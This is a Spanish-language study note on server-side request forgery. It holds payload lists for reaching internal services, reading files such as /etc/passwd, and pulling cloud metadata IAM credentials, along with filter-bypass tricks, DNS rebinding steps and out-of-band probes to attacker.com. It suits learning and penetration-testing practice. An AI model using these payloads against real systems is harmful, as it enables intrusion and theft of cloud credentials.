---
title: "SSRF — Server-Side Request Forgery"
type: note
status: active
tags:
  - seguridad
  - web
  - ssrf
  - vulnerabilidades
aliases:
  - Server-Side Request Forgery
  - SSRF
created: 2026-06-13
updated: 2026-06-13
---

# SSRF — Server-Side Request Forgery

> [!INFO] Fuente
> PortSwigger SSRF, PayloadsAllTheThings, Hacking The Cloud.

---

## Que es

El servidor hace peticiones a recursos a partir de input del usuario. Si el input no esta sanitizado, **el atacante controla a donde va esa peticion**.

```
Usuario → App → URL controlada → Servidor interno
                                  ↓
                          http://169.254.169.254/
                          http://127.0.0.1:9200/
                          file:///etc/passwd
```

---

## Clasificacion

### Basic SSRF

```http
POST /api/fetch HTTP/1.1
Content-Type: application/json

{"url": "https://target.com/api/data"}
→ Probar: {"url": "http://127.0.0.1:8080/admin"}
```

### Blind SSRF

No ves la respuesta directamente, pero podes inferir por:

```bash
# Time-based
{"url": "http://127.0.0.1:8080"}  # Tarda en conectar
{"url": "http://127.0.0.1:9999"}  # Rechazo inmediato

# Out-of-band (OOB)
{"url": "http://attacker.com/collab"}
# Si el servidor hace la peticion a tu servidor, sabes que SSRF funciona
```

### Semi-blind SSRF

Ves errores pero no la respuesta:

```
Error: No se pudo conectar a http://127.0.0.1:8080/
Error: Tiempo de espera agotado para http://127.0.0.1:9999/
```

---

## Targets clasicos

### Localhost

```bash
http://127.0.0.1:8080/
http://127.0.0.1:9200/         # Elasticsearch
http://127.0.0.1:3000/         # Node/Grafana
http://127.0.0.1:6379/         # Redis
http://127.0.0.1:27017/        # MongoDB
http://127.0.0.1:5432/         # PostgreSQL
http://localhost:8080/actuator # Spring Actuator
```

### Alternativas a 127.0.0.1

```
localhost
0.0.0.0
[::]                         # IPv6 loopback
[0:0:0:0:0:ffff:127.0.0.1]  # IPv4-mapped IPv6
0x7f000001                   # Hex
2130706433                   # Decimal
0177.0.0.1                   # Octal
127.1                        # Acortado
127.0.1
```

### Cloud Metadata

```bash
AWS:   http://169.254.169.254/latest/meta-data/
AWS:   http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLENAME
GCP:   http://metadata.google.internal/computeMetadata/v1/
Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

### File read

```bash
file:///etc/passwd
file:///proc/self/environ
file:///proc/self/cmdline
file:///var/www/html/config.php
```

### Internal services

```bash
http://127.0.0.1:9200/_cat/indices?v       # Elasticsearch
http://127.0.0.1:3000/api/grafana/dashboards
http://127.0.0.1:9090/api/v1/targets       # Prometheus
http://127.0.0.1:8500/v1/agent/members     # Consul
http://127.0.0.1:8200/v1/secret/metadata   # Vault
http://127.0.0.1:2375/version              # Docker API
```

---

## Bypass de filtros

### Allowlist bypass

| Tecnica | Ejemplo |
|---------|---------|
| Redirect | Usar un redirector abierto que apunte a 127.0.0.1 |
| DNS rebinding | Dominio propio que alterna entre IP publica y privada |
| URL parsing confusion | `http://expected.com@127.0.0.1` |
| Double encoding | `http://127.0.0.1%2f%2f` |
| Subdominio DNS controlado | `ssrf.attacker.com → 127.0.0.1` |

### DNS rebinding en detalle

```
1. Compras dominio attacker.com
2. Configuras TTL a 0
3. Primera resolucion: 1.2.3.4 (tu servidor, valida URL)
4. El request se valida (URL permitida)
5. El servidor resuelve de nuevo antes de hacer la peticion
6. Segunda resolucion: 127.0.0.1 → SSRF exitoso
```

### URL parsing confusion

```python
# Python urllib vs requests (diferencias)
http://google.com@127.0.0.1
  # urllib.parse → host = "google.com" (mal!)
  # requests → host = "127.0.0.1"

http://127.0.0.1:80\@google.com/
  # Algunos parsers leen @ como separador de credenciales
```

---

## SSRF + Cloud = Game Over

```bash
# Cadena de atque clasica
1. POST /api/fetch { "url": "http://169.254.169.254/latest/meta-data/" }
2. Respuesta: directorios disponibles
3. POST /api/fetch { "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/" }
4. Respuesta: nombre del rol
5. POST /api/fetch { "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLENAME" }
6. → AccessKeyId, SecretAccessKey, Token
7. aws s3 ls s3://target-bucket --no-sign-request
```

---

## Blind SSRF con Burp Collaborator

```http
POST /api/fetch HTTP/1.1
Content-Type: application/json

{"url": "http://BURPCOLLABORATOR.oastify.com"}
```

Si recibis el DNS/HTTP request en Collaborator → SSRF funciona.
Despues probas con localhost/metadata.

---

## Tools

| Herramienta | Uso |
|-------------|-----|
| Burp Collaborator | OOB detection |
| Interactsh | OOB detection (ProjectDiscovery) |
| SSRFmap | Framework de SSRF |
| Gopherus | SSRF con protocolo gopher:// |

---

## Labs

| Recurso | Link |
|---------|------|
| PortSwigger SSRF | portswigger.net/web-security/ssrf |
| TryHackMe SSRF | tryhackme.com |

---

## Ver tambien

- [[SEGURIDAD/Vulnerabilidades Web]]
- [[SEGURIDAD/Cloud Hacking]]
- [[SEGURIDAD/Hacking Activo]]
- [[SEGURIDAD/00 - INDICE]]
